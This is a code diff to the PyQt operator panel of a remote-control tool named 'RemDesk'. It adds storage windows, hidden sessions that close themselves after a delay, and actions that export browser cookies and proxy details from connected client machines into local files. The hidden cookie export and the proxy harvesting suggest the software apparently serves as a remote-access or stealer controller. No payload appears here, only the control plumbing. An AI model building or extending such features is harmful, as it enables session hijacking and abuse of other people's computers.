@@ -36,6 +36,8 @@ class MainShell(QtWidgets.QWidget):
         self._ping_ms = None
         self._server_online = None
         self._session_windows: Dict[str, RemoteSessionDialog] = {}
+        self._storage_windows: Dict[str, RemoteSessionDialog] = {}
+        self._utility_sessions: Dict[str, RemoteSessionDialog] = {}
         layout = QtWidgets.QHBoxLayout(self)
         layout.setContentsMargins(20, 20, 20, 20)
         layout.setSpacing(16)
@@ -247,8 +249,19 @@ class MainShell(QtWidgets.QWidget):
         client = next((c for c in self.dashboard.clients if c["id"] == client_id), None)
         client_name = client["name"] if client else client_id
         self.logger.log("log_storage_open", client=client_name)
-        if not self._open_session(client_id, open_storage=True):
+        session = self._session_windows.get(client_id)
+        if session:
+            session.open_storage_drawer()
+            session.raise_()
+            session.activateWindow()
             return
+        storage_window = self._storage_windows.get(client_id)
+        if storage_window:
+            storage_window.open_storage_drawer()
+            storage_window.raise_()
+            storage_window.activateWindow()
+            return
+        self._open_storage_session(client_id)
 
     def toggle_connection(self, client_id: str, currently_connected: bool) -> None:
         client = next((c for c in self.dashboard.clients if c["id"] == client_id), None)
@@ -281,6 +294,9 @@ class MainShell(QtWidgets.QWidget):
             browsers = [] if browser == "all" else [browser]
             self.request_cookie_export(client_id, browsers)
             return
+        if action == "proxy":
+            self.request_proxy_export(client_id)
+            return
 
     def request_cookie_export(self, client_id: str, browsers: list[str]) -> None:
         client = next((c for c in self.dashboard.clients if c["id"] == client_id), None)
@@ -292,13 +308,38 @@ class MainShell(QtWidgets.QWidget):
         if not folder:
             return
         filename = self._build_cookie_filename(browsers)
-        if not self._open_session(client_id):
-            return
-        window = self._session_windows.get(client_id)
-        if not window:
-            return
+        window = self._session_windows.get(client_id) or self._storage_windows.get(client_id)
+        if window is None:
+            window = self._open_utility_session(client_id)
+            if window is None:
+                return
+            self._schedule_utility_close(client_id)
         window.request_cookie_export(browsers, filename=filename, download_dir=folder)
         self.logger.log("log_cookies_request", client=client_name, browsers=label, path=folder)
+
+    def request_proxy_export(self, client_id: str) -> None:
+        client = next((c for c in self.dashboard.clients if c["id"] == client_id), None)
+        client_name = client["name"] if client else client_id
+        folder = QtWidgets.QFileDialog.getExistingDirectory(
+            self, self.i18n.t("storage_pick_folder"), ""
+        )
+        if not folder:
+            return
+        safe_id = self._sanitize_filename_token(client_id)
+        filename = f"proxy_{safe_id}.txt"
+        window = self._session_windows.get(client_id) or self._storage_windows.get(client_id)
+        if window is None:
+            window = self._open_utility_session(client_id)
+            if window is None:
+                return
+            self._schedule_utility_close(client_id)
+        window.request_proxy_export(client_id, filename=filename, download_dir=folder)
+        self.logger.log("log_proxy_request", client=client_name, path=folder)
+
+    @staticmethod
+    def _sanitize_filename_token(value: str) -> str:
+        cleaned = "".join(ch if ch.isalnum() or ch in {"-", "_"} else "_" for ch in value)
+        return cleaned or "client"
 
     @staticmethod
     def _build_cookie_filename(browsers: list[str]) -> str:
@@ -379,12 +420,21 @@ class MainShell(QtWidgets.QWidget):
                 session_id=client_id,
                 auto_connect=True,
                 open_storage=open_storage,
+                manage_mode=True,
+                storage_only=False,
             )
             window.raise_()
             window.activateWindow()
             return True
 
-        session_url = build_session_url(base_url, client_id, token, open_storage=open_storage)
+        session_url = build_session_url(
+            base_url,
+            client_id,
+            token,
+            open_storage=open_storage,
+            mode="manage",
+            storage_only=False,
+        )
 
         if not webengine_available():
             QtWidgets.QMessageBox.warning(
@@ -394,11 +444,150 @@ class MainShell(QtWidgets.QWidget):
             )
             return False
 
-        dialog = RemoteSessionDialog(client_id, session_url, base_url, token, open_storage, self)
+        dialog = RemoteSessionDialog(
+            client_id,
+            session_url,
+            base_url,
+            token,
+            open_storage,
+            manage_mode=True,
+            storage_only=False,
+            show_window=True,
+            parent=self,
+        )
         dialog.closed.connect(self._handle_session_closed)
         self._session_windows[client_id] = dialog
         dialog.show()
         return True
+
+    def _open_storage_session(self, client_id: str) -> bool:
+        if not client_id:
+            QtWidgets.QMessageBox.warning(
+                self,
+                "RemDesk",
+                "Unable to open storage: missing client id.",
+            )
+            return False
+        base_url = self._resolve_server_url()
+        token = self._resolve_api_token()
+        if client_id in self._storage_windows:
+            window = self._storage_windows[client_id]
+            window.apply_context(
+                server_url=base_url,
+                token=token,
+                session_id=client_id,
+                auto_connect=True,
+                open_storage=True,
+                manage_mode=False,
+                storage_only=True,
+            )
+            window.raise_()
+            window.activateWindow()
+            return True
+
+        session_url = build_session_url(
+            base_url,
+            client_id,
+            token,
+            open_storage=True,
+            mode="view",
+            storage_only=True,
+        )
+
+        if not webengine_available():
+            QtWidgets.QMessageBox.warning(
+                self,
+                "RemDesk",
+                "PyQt6-WebEngine is required to open storage sessions in a window.",
+            )
+            return False
+
+        dialog = RemoteSessionDialog(
+            client_id,
+            session_url,
+            base_url,
+            token,
+            True,
+            manage_mode=False,
+            storage_only=True,
+            show_window=True,
+            parent=self,
+        )
+        dialog.closed.connect(self._handle_storage_session_closed)
+        self._storage_windows[client_id] = dialog
+        dialog.show()
+        return True
+
+    def _open_utility_session(self, client_id: str) -> RemoteSessionDialog | None:
+        if not client_id:
+            QtWidgets.QMessageBox.warning(
+                self,
+                "RemDesk",
+                "Unable to open session: missing client id.",
+            )
+            return None
+        base_url = self._resolve_server_url()
+        token = self._resolve_api_token()
+        if client_id in self._utility_sessions:
+            window = self._utility_sessions[client_id]
+            window.apply_context(
+                server_url=base_url,
+                token=token,
+                session_id=client_id,
+                auto_connect=True,
+                open_storage=False,
+                manage_mode=False,
+                storage_only=False,
+            )
+            return window
+
+        session_url = build_session_url(
+            base_url,
+            client_id,
+            token,
+            open_storage=False,
+            mode="view",
+            storage_only=False,
+        )
+
+        if not webengine_available():
+            QtWidgets.QMessageBox.warning(
+                self,
+                "RemDesk",
+                "PyQt6-WebEngine is required to export client data.",
+            )
+            return None
+
+        dialog = RemoteSessionDialog(
+            client_id,
+            session_url,
+            base_url,
+            token,
+            False,
+            manage_mode=False,
+            storage_only=False,
+            show_window=False,
+            parent=self,
+        )
+        dialog.closed.connect(self._handle_utility_session_closed)
+        self._utility_sessions[client_id] = dialog
+        dialog.show()
+        return dialog
+
+    def _schedule_utility_close(self, client_id: str, delay_ms: int = 60000) -> None:
+        def _close_if_idle() -> None:
+            window = self._utility_sessions.get(client_id)
+            if window is None:
+                return
+            window.close()
+
+        QtCore.QTimer.singleShot(delay_ms, _close_if_idle)
+
+    def _handle_storage_session_closed(self, client_id: str) -> None:
+        self._storage_windows.pop(client_id, None)
+
+    def _handle_utility_session_closed(self, client_id: str) -> None:
+        self._utility_sessions.pop(client_id, None)
 
     def _close_session(self, client_id: str) -> None:
         dialog = self._session_windows.pop(client_id, None)
